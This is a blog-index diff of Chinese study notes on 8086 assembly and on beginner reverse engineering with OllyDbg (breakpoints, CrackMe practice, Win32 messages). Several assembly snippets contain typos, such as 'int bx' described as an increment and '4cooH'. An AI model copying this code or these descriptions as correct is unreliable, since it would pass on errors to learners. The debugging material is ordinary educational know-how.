class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><code>dw</code>的含义是定义字形数据，全称是 <code>define word</code>，这里定义了8个字形数据，也就是16个字节。</p><p>数据的位置：程序在运行的时候CS中存放代码段的段地址。</p><p>偏移地址：DW定义的数据处于代码段的最开始，所以偏移地址为0，这8个代码段的偏移地址就是0、2、4、6、8、A、C、E处，程序运行时，他们的地址就是CS:0,CS:2…</p><h2 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h2><p>大致思路：程序运行时，定义的数据存放在CS:0~CS:F单元中，依次将这8个字单元入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。</p><p>可以在程序中定义数据来取得一段空间，然后将这段空间当做栈来使用。</p><h2 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h2><p>当数据、代码、栈所需的空间超过64Kb时，就不能放在一个段里（一个段的容量不能超过64Kb，只针对于8086CPU）</p><p>定义段的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start:mov ax,stack</span><br><span class="line">mov ss,ax;设置栈顶ss:sp指向stack:20</span><br><span class="line">mov sp,20h</span><br></pre></td></tr></table></figure><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逆向（调试）学习笔记(0X01)</title>
+      <link href="2020/09/21/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x01/"/>
+      <url>2020/09/21/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="动态分析技术（1）"><a href="#动态分析技术（1）" class="headerlink" title="动态分析技术（1）"></a>动态分析技术（1）</h1><h2 id="OllyDbg调试器"><a href="#OllyDbg调试器" class="headerlink" title="OllyDbg调试器"></a>OllyDbg调试器</h2><p>OllyDbg（简称OD）是一款拥有可视化界面的用户模式调试器。可在任意版本的Windows上运行。</p><p>OD结合了静态和动态分析。对异常的跟踪与处理相当灵活。</p><p>它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其注释出来。</p><p>它会自动分析函数过程、循环语句、代码中的字符串等等。</p><h3 id="OllyDbg的界面"><a href="#OllyDbg的界面" class="headerlink" title="OllyDbg的界面"></a>OllyDbg的界面</h3><blockquote><p>单机“File”–&gt;“Open”选项（快捷键F3）打开一个exe文件，OllyDbg会立刻加载该exe文件，自动分析兵列出汇编代码</p><p>默认的当前窗口是CPU窗口，对应的图标是”C”,该窗口包括5个面板窗口，分别是汇编面板、寄存器面板、信息面板、数据面板和栈面板。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/whh6tl/img/master/NiXiang/NX-TS-001.png" alt="nx-ts-001"></p><ol><li><p>反汇编面板窗口</p><blockquote><p>反汇编面板窗口显示被调试程序的代码，有四列，分别是地址、16进制的机器码、反汇编代码、注释。</p><p>（最后一列注释中显示了相关API参数或运行简表）</p><p>反汇编面板的列中，双击可完成如下操作：</p><ul><li>Address列：显示被双击地址的相对地址，再次双击返回标准模式地址。</li><li>Hex dump列：设置或取消无条件断点，对应的快捷键是F2</li><li>Disassembly列：调用汇编器，可直接修改汇编代码，对应的快捷键是空格键。</li><li>Comment列：允许增加或编辑注释，对应的快捷键是“；”键。</li></ul></blockquote></li><li><p>信息面板窗口</p><blockquote><p>在进行动态跟踪时，信息面板窗口将显示与指令相关的各寄存器的值、API函数调用提示和跳转提示等信息。</p></blockquote></li><li><p>数据面板窗口</p><blockquote><p>数据面板窗口以16进制和字符的形式，显示文件在内存中的数据。</p><p>要显示指定地址内存数据，可单机右键快捷菜单中的“Go to expression”命令或按“Ctrl+G”快捷键，打开地址窗口，输入地址。</p></blockquote></li><li><p>寄存器面板窗口</p><blockquote><p>显示CPU各寄存器的值，支持浮点、MMX和3DNow！寄存器</p></blockquote></li><li><p>栈面板窗口</p><blockquote><p>显示栈的内容，即ESP指向地址的内容。将数据放入栈的操作叫入栈（push），取出的动作叫出栈（pop）。</p><p>（栈窗口非常重要）各API函数和子程序都利用它传递参数和变量等。</p></blockquote></li></ol><h3 id="OllyDbg的配置"><a href="#OllyDbg的配置" class="headerlink" title="OllyDbg的配置"></a>OllyDbg的配置</h3><p>设置项在“Options”菜单里，有界面选项（Appearance）和调试选项（Debugging Options），这些选项的配置都保存在ollydbg.ini文件里。</p><blockquote><p>UDD路径：保存调试信息，方便下次继续调试</p><p>插件路径：存放插件</p></blockquote><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>（专门为解密联系制作的小程序，一般统称为CrackMe）</p><p>为了让OllyDbg终端在程序的入口点，在加载程序前进行相应的设置：</p><ol><li>运行OllyDbg，单击“Options”–&gt;“Debugging options”选项，打开调试选项配置对话框</li><li>单击“Event“标签，设置OllyDbg对终端入口点、模块加载/卸载、线程创建/结束等事件的处理方式，一般只需要将断点设置在”**<code>WinMain</code>**“处。</li><li>设置完成后，打开CrackMe.exe，此时OllyDbg会中断在TrackMe.exe第一条指令处。，调试器等待用户下一步指令。</li></ol><p>下图各部分代码的含义如下：</p><ul><li>虚拟地址：在一般情况下，同一程序的同一指令在不同环境下此值相同。</li><li>机器码：就是CPU执行的机器代码。</li><li>汇编指令：与机器码对应的程序代码</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/NiXiang/NX-TS-002.png?raw=true" alt="NX-TS-002"></p><p><strong>单步跟踪：</strong></p><p>调试器的一个最基本的功能就是动态跟踪。OllyDbg在“Debug”菜单里控制运行的命令，各个菜单都有相应的快捷键</p><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/NiXiang/NX-TS-003.png?raw=true" alt="nx-ts-003"></p><p>“call 00401DA0”表示调用00101DA0处的子程序。一旦子程序调用完成，就会返回call指令的下一条指令。</p><p><strong>设置断点</strong></p><p>断点（breakpoint）可以让程序中断在指定的地方，从而更方便的对其进行调试，将鼠标移到地址处，按<strong>F2</strong>即可设置断点，再次按F2即可取消断点。</p><p>设置断点后，按<strong>“Alt+B”</strong>快捷键或者点击“B”按钮，打开断电窗口，查看断点明细。</p><p><strong>Ctrl+G</strong>：跟随表达式窗口。</p><p><strong>调试分析</strong></p><p>按“F8”单步走出函数。”Alt+F9“快捷键回到调用函数的地方</p><blockquote><p><strong>阅读代码时注意的点</strong>：</p><ul><li>清楚各API函数的定义</li><li>API函数大多采用_stdcall调用约定，即函数入口参数从右到左顺序入栈，由<strong>被调用者</strong>清理栈中的参数，返回值存放在<strong>eax</strong>中，对相关API函数，要注意push指令。</li><li>C代码中的子程序采用C调用约定，函数入口参数从右到左顺序入栈，由<strong>调用者</strong>清理栈中的参数</li></ul></blockquote><h3 id="常用断点"><a href="#常用断点" class="headerlink" title="常用断点"></a>常用断点</h3><blockquote><p>常用断点主要有INT3断点、硬件断点、内存断点、消息断点等。</p></blockquote><h4 id="INT3断点"><a href="#INT3断点" class="headerlink" title="INT3断点"></a><strong>INT3断点</strong></h4><blockquote><p><code>F2</code>设置的断点就是INT3断点，也叫作<code>CC</code>断点</p><p>原理：替换为INT3指令、OD检测到INT3指令后引发一个异常，并且补货它，这时候程序就会中断，将INT3指令给删除掉，还原之前的代码。</p><p>优点：无限的下INT3断点</p><p>缺点：很容易被检测。</p></blockquote><h4 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a><strong>硬件断点</strong></h4><blockquote><p>跟调试寄存器有关，DR0~DR7,</p><p>地址栏右键 –&gt; 断点 –&gt; 硬件执行。</p><p><strong>查看</strong>：调试 –&gt; 硬件断点</p><p><strong>原理</strong>：</p><ol><li>DR0~DR3：保存需要断点的地址</li><li>DR6：状态寄存器</li><li>DR7：（控制寄存器）设置相对于的控制位</li><li>当程序运行到断点的时候，CPU像OD发送异常信息，然后程序中断，等待用户操作。</li></ol><p>优点：速度快，不容易被检测（不修改代码）</p><p>缺点：只能下四个硬件断点</p></blockquote><h4 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a><strong>内存断点</strong></h4><blockquote><p>原理：将原来的属性改为不可读写执行，程序会产生异常，OD就会捕获，然后程序中断</p><p>地址栏右键 –&gt; 断点 –&gt; 内存访问/写入。     </p><p>优点：不改变汇编代码</p></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向（调试） </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X09)</title>
+      <link href="2020/09/10/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x09/"/>
+      <url>2020/09/10/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x09/</url>
+      
+        <content type="html"><![CDATA[<h2 id="程序执行过程的跟踪"><a href="#程序执行过程的跟踪" class="headerlink" title="程序执行过程的跟踪"></a>程序执行过程的跟踪</h2><p>为了观察程序运行的过程，可以用Debug，例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug 1.exe</span><br></pre></td></tr></table></figure><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">mov ax,2000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0</span><br><span class="line">add sp,10</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="BX-和loop指令"><a href="#BX-和loop指令" class="headerlink" title="[BX]和loop指令"></a>[BX]和loop指令</h1><h2 id="bx"><a href="#bx" class="headerlink" title="[bx]"></a>[bx]</h2><p>[bx]表示一个内存单元，它的偏移地址在bx寄存器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">&#x2F;&#x2F;bx中存放的数据作为一个偏移地址EZ,段地址SA默认在ds中，将SA:EA处的数据送入ax中</span><br><span class="line">&#x2F;&#x2F;即：ax&#x3D;ds*16+bx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1</span><br><span class="line">int bx</span><br><span class="line">&#x2F;&#x2F;int bx的含义是bx中的内容加1</span><br></pre></td></tr></table></figure><p>[BX]的功能：</p><blockquote><p>mov ax,[bx]</p><p>bx中存放数据作为一个偏移地址EA，短地址SA中的数据默认在ds中，将SA:EA中的数据送入ax中，即：（ax）=（（ds）*16+（bx））</p></blockquote><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><p>循环，loop指令的格式是：<code>loop 标号</code>，CPU执行loop指令的时候，要进行两步操作：</p><ol><li><p>​    cx=cx-1</p></li><li><p>判断cx中的值，不为0则转至标号处继续执行，为0则向下执行，例如：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cd:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4cooH</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="loop和-bx-的联合应用"><a href="#loop和-bx-的联合应用" class="headerlink" title="loop和[bx]的联合应用"></a>loop和[bx]的联合应用</h2><p> 例：</p><p> assume csLcode</p><p> code segment</p><p> ​        mov ax,0ffffh</p><p> ​        mov as,ax</p><p> ​        mov bx,0        ;初始化ds：bx指向ffff：0</p><p> ​        mov dx,0        ;初始化累加寄存器dx，（dx）=0</p><p> ​        mov cx,12       ;初始化循环计数寄存器cx，（cs）=12</p><p> s:     mov al,[bx[]</p><p> ​        mov ah,0</p><p> ​        add dx,ax        ;间接向dx中加上((ds)*16+(bx)单元的数值</p><p> ​        inc bx               ;ds:bx指向下一个单元</p><p> ​        loop s</p><p> ​        mov ax,4c00h</p><p> ​        int 21h</p><p> code ends</p><p> end</p></li></ol><h2 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h2><p>指令<code>mov ax,[bx]</code>中，段地址默认在ds中，在访问内存单元时可以指定段寄存器，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[bx]&#x2F;&#x2F;段地址在ds寄存器中，偏移地址为在[bx]寄存器中</span><br><span class="line">mov ax,cs:[bx]</span><br><span class="line">mov ax,ss:[0]&#x2F;&#x2F;段地址在ss寄存器中，偏移地址为0</span><br></pre></td></tr></table></figure><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逆向（基础）学习笔记(0X01)</title>
+      <link href="2020/09/10/%E9%80%86%E5%90%91-%E5%9F%BA%E7%A1%80-%E7%AC%94%E8%AE%B0_0x01/"/>
+      <url>2020/09/10/%E9%80%86%E5%90%91-%E5%9F%BA%E7%A1%80-%E7%AC%94%E8%AE%B0_0x01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是加密与解密"><a href="#什么是加密与解密" class="headerlink" title="什么是加密与解密"></a>什么是加密与解密</h2><h3 id="软件的加密与解密"><a href="#软件的加密与解密" class="headerlink" title="软件的加密与解密"></a>软件的加密与解密</h3><blockquote><p>软件的加密与解密技术是矛与盾的关系，它们实在相互竞争中发展进步的。</p><p>研究解密技术有助于掌握一些windows的底层技术。</p></blockquote><h3 id="软件逆向工程"><a href="#软件逆向工程" class="headerlink" title="软件逆向工程"></a>软件逆向工程</h3><blockquote><p>逆向工程是根据已有的产物或者结果，通过分析来推导出具体的实现方法。</p><p>对软件来说： <strong>“可执行程序  –&gt;  反编译  –&gt;  源代码”</strong>  的过程就是逆向工程</p></blockquote><p>逆向工程的内容可以分为如下3类：</p><ul><li>软件使用限制的去除，或者软件功能的增加</li><li>软件源代码的再获得</li><li>硬件的复制和模拟</li></ul><h3 id="逆向分析技术"><a href="#逆向分析技术" class="headerlink" title="逆向分析技术"></a>逆向分析技术</h3><ol><li><p>通过软件使用说明和操作格式分析软件</p><blockquote><p>若要分析一个软件，首先应该学习如何使用该软件。首先应详细约定使用手册。</p></blockquote></li><li><p>静态分析技术</p><blockquote><p>静态分析是指通过<strong>反汇编</strong>得到的程序清单进行分析，最常用的方法是<strong>从提示信息入手</strong>进行分析。</p><p>阅读通过静态反汇编得到的程序清单，通过包含提示信息的程序清单，就可以知道提示信息前后的程序片段所完成的功能，从而宏观的了解软件的编程思路。</p><p>常用工具有IDA等。</p></blockquote></li><li><p>动态分析技术</p><blockquote><p>静态分析只是第一步，动态跟踪才是分析软件的关键。动态跟踪的主要工具有<code>OllyDbg</code>，<code>WinDbg</code>等工具。</p><p>对软件进行动态分析的意义：</p><ol><li>许多软件在整体上完成的功能，一般分为多个模块来实现，后一个模块往往需要调用前面模块处理的结果，这一结果叫做<strong>中间结果</strong></li><li>许多软件在运行时，其最初执行的模块往往需要对后面的模块进行一些初始化的工作，并不依赖系统的重定位。</li><li>许多软件为了阻止非法跟踪，大部分代码都加密，运行时在逐块解密、逐块执行。</li></ol></blockquote><p> 如何有效地进行动态分析：</p><ol><li><p>软件进行粗跟踪</p><blockquote><p>所谓粗跟踪，就是在跟踪是要大块大块的跟踪。</p><p>在遇到调用指令（CALL），重复操作指令（REF），循环操作指令（LOOP）等时一般不要跟踪，因为太浪费经历，得不偿失。</p></blockquote></li><li><p>对关键部分进行细跟踪</p><blockquote><p>在对软件进行一定的粗跟踪后，就能获取我们所关系的模块或程序段了，这样就可以有针对性的对该模块进行详细的跟踪分析。</p><p>在每次跟踪时把比较关键的中间结果或指令记录下来，对之后的分析会有帮助。</p></blockquote></li></ol></li></ol><h2 id="文本字符"><a href="#文本字符" class="headerlink" title="文本字符"></a>文本字符</h2><p>计算机中存储的信息都是二进制数，屏幕上的内容都是二进制数转换之后的结果。</p><h3 id="ASCII与Unicode字符集"><a href="#ASCII与Unicode字符集" class="headerlink" title="ASCII与Unicode字符集"></a>ASCII与Unicode字符集</h3><blockquote><p>字符集是一个系统支持的所有抽象字符的集合。字符是所有文字和符号的总称。</p><p>ASCII码（美国信息交换标准码）</p><p>Unicode是ASCII字符编码的一个扩展，只不过在windows中用2字节对其进行编码，因此也被称为宽字符集</p></blockquote><h3 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h3><blockquote><p>endian，翻译为”<strong>字节序</strong>“，表示数据在存储器中的存放顺序，主要分为大端序（Big-endian）和小端序（Little-endian），区别如下：</p><ul><li>Big-endian：高位字节存入低地址，低位字节存入高地址。</li><li>Little-endian：高位字节存入高地址，低位字节存入低地址。</li></ul><p>一般来说，x86系列CPU都是Little-endian字节序，PowerPC一般都是Big-endian字节序。因为网络协议也是采用Big-endian传输的，所以有事也把Big-endian方式成为网络字节序。</p></blockquote><h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><h3 id="WIN32-API函数"><a href="#WIN32-API函数" class="headerlink" title="WIN32 API函数"></a>WIN32 API函数</h3><blockquote><p>API全称Application Programming Interface（<strong>应用程序编程接口</strong>）</p><p>可以认为API接口是整个Windows框架的基石，它的下面是Windows系统核心，它的上面则是Windows应用程序。</p><p>用16位Windows 的API称作Win16，32位Windows的API称作win32，64位Windows API的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。</p><p>Windows运转的核心是动态链接，Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（<code>DLL</code>）实现。</p><p>Windows的三个子系统：</p><ul><li>Kernel（由KERNEL32.DLL实现）：操作系统核心服务功能，包括进行与线程控制、内存管理、文件访问等。</li><li>User（由USER32.DLL实现）：负责处理用户接口，包括键盘鼠标输入、窗口和菜单管理等。</li><li>GDI(由GDI32.DLL实现)：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</li></ul><p>其他DLL：</p><ul><li>对象安全性，注册表操作：ADVAPI32.DLL</li><li>通用控件：COMCTL32.DLL</li><li>公共对话框：COMDLG32.DLL</li><li>用户界面外壳：SHELL32.DLL</li><li>网络：NETAPI32.DLL</li></ul></blockquote><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><blockquote><p>WOW64是64位Windows的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p><p>WOW64既不支持16位应用程序的执行，也不支持加载32位内核模式的设备驱动器。</p></blockquote><h3 id="Windows消息机制"><a href="#Windows消息机制" class="headerlink" title="Windows消息机制"></a>Windows消息机制</h3><blockquote><p>Windows是一个消息驱动式系统。</p><p>Windows消息提供在应用程序与应用程序之间、应用程序与Windows系统之间进行通信的手段。</p><p>Windows系统中有两种消息队列</p><ul><li>系统消息队列</li><li>应用程序消息队列</li></ul><p>常用的Windows消息函数：</p><ol><li><p><code>SendMessage</code>函数</p><p> <em>调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，<strong>否则该函数不会返回</strong>实例函数如下：</em></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LRESULT SendMessage(</span><br><span class="line">HWND hWnd,&#x2F;&#x2F;目的窗口的句柄</span><br><span class="line">UNIT Msg，&#x2F;&#x2F;消息标识符</span><br><span class="line">WPARAM wParam&#x2F;&#x2F;消息的WPARAM域</span><br><span class="line">LPARAM lParam&#x2F;&#x2F;消息的LPARAM域</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F;返回值，由具体的消息决定。如果消息投递成功，则返回TRUE。</span><br></pre></td></tr></table></figure></li><li><p>WM_COMMAND消息</p><p> <em>当用户从菜单或按钮中选择一条命令或者一个控件时，该消息被发送给它的父窗口，或者当一个快捷键被释放时发送。</em></p><p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零。</p></li><li><p>WM_DESTROY消息</p><p> <em>当一个窗口被销毁时发送此消息，该消息的16进制数是02h，没有参数</em></p><p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零</p></li><li><p>WM_GETTEXT消息</p><p> <em>应用程序发送一条此消息，将一个对应窗口的文本信息复制到一个由呼叫程序提供的缓冲区中。</em></p><p> <strong>返回值</strong>：被复制的字符数</p></li><li><p>WM_QUIT消息</p><p> <em>当应用程序调用<code>PostQuitMessage</code>函数时，生成此消息</em></p><p> <strong>返回值</strong>：这条消息没有返回值。</p></li><li><p>WM_LBUTTONDOWN消息</p><p> <em>当光标停在一个窗口的客户区并且点下鼠标左键时，此消息将被发送。</em></p><p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零。</p></li></ol></blockquote><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><blockquote><p>虚拟内存不是真正的内存，它通过映射的方法使可用虚拟地址达到4GB，每个应用程序可获得2GB的虚拟地址，剩余的2GB虚拟地址留给操作系统自用。</p><p>虚拟内存要点：</p><ol><li>应用程序不会直接访问物理地址</li><li>虚拟内存管理区通过虚拟地址的访问请求来控制所有的物理地址访问</li><li>每个应用程序都有独立的4GB寻址空间，不同的应用程序的地址空间是彼此隔离的。</li><li>DLL程序没有私有空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。</li></ol><p>虚拟内存的好处：</p><ul><li>简化了内存的管理</li><li>弥补了物理内存的不足</li><li>防止多任务环境下应用程序的冲突</li></ul></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向（基础） </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X08)</title>
+      <link href="2020/09/09/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x08/"/>
+      <url>2020/09/09/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x08/</url>
+      
+        <content type="html"><![CDATA[<h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><h2 id="一个源程序从写出到执行的过程"><a href="#一个源程序从写出到执行的过程" class="headerlink" title="一个源程序从写出到执行的过程"></a>一个源程序从写出到执行的过程</h2><ol><li><h3 id="文本编辑-–-gt-源程序文件"><a href="#文本编辑-–-gt-源程序文件" class="headerlink" title="文本编辑 –&gt;  源程序文件"></a>文本编辑 –&gt;  源程序文件</h3><p> 使用文本编辑器，用汇编语言编写汇编源程序</p></li><li><h3 id="编译链接-–-gt-可执行文件"><a href="#编译链接-–-gt-可执行文件" class="headerlink" title="编译链接  –&gt;  可执行文件"></a>编译链接  –&gt;  可执行文件</h3><p> 使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件；再用链接程序对目标文件进行链接，生成可在操作系统中直接运行的可执行文件，这一步的结果，产生了一个可在操作系统中运行的可执行文件。</p><blockquote><p>可执行文件包含两部分内容</p><ul><li>程序（从源程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li><li>相关的描述信息（比如，程序有多大、要占用多少内存空间等）</li></ul></blockquote></li><li><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p> 在操作系统中，执行可执行文件中的程序</p></li></ol><h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><ol><li><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><blockquote><p><code>XXX segment</code></p><p><code>···</code></p><p><code>···</code></p><p><code>XXX ends</code></p><p>segment说明一个段开始，ends说明一个段结束</p></blockquote><blockquote><p><code>end</code></p><p>end是一个回避版程序的结束标记</p></blockquote><blockquote><p><code>assume</code></p><p>这条伪指令的含义为“假设”。它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关</p></blockquote></li><li><h3 id="源程序中的“程序”"><a href="#源程序中的“程序”" class="headerlink" title="源程序中的“程序”"></a>源程序中的“程序”</h3><p> 可以将源程序文件中的所有内容成为<strong>源程序</strong>，将最终由机器执行、处理的数据成为<strong>程序</strong></p><p> 程序最先由汇编指令的形式存在于源程序中，经过编译、连接后转变为机器码，存储在可执行文件中。</p></li><li><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><p> 除了汇编指令和伪指令外，还有一些标号，比如“codesg”。一个标号代表了一个地址，比如“codesg”在“segment”前面，作为一个段的名称，这个段的名称最终被编译、连接处理成一个段地址。</p></li><li><h3 id="程序的结构"><a href="#程序的结构" class="headerlink" title="程序的结构"></a>程序的结构</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc&#x2F;&#x2F;&quot;abc被当做胆码段来用，所以，应该将abc和cs联系起来&quot;</span><br><span class="line"></span><br><span class="line">abc segment         &#x2F;&#x2F;&quot;定义一个段，名称为abc&quot;</span><br><span class="line"></span><br><span class="line">mov ax,2\</span><br><span class="line">add ax,ax --&gt;&quot;实现的指令&quot;</span><br><span class="line">add,ax,ax&#x2F;</span><br><span class="line"></span><br><span class="line">abc ends&#x2F;&#x2F;&quot;段在何处结束&quot;</span><br><span class="line"></span><br><span class="line">end&#x2F;&quot;程序在何处结束&quot;</span><br></pre></td></tr></table></figure></li><li><h3 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h3><p> 一个程序结束后，将CPU的控制权交还给似的它可以运行的程序，这个过程称为程序返回。</p><p> 程序返回的指令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure><h2 id="编辑源程序"><a href="#编辑源程序" class="headerlink" title="编辑源程序"></a>编辑源程序</h2><ol><li><p>进入CMD</p></li><li><p>运行  <code>edit</code></p></li><li><p>file-&gt;new</p><h2 id="编译"><a href="#编译" class="headerlink" 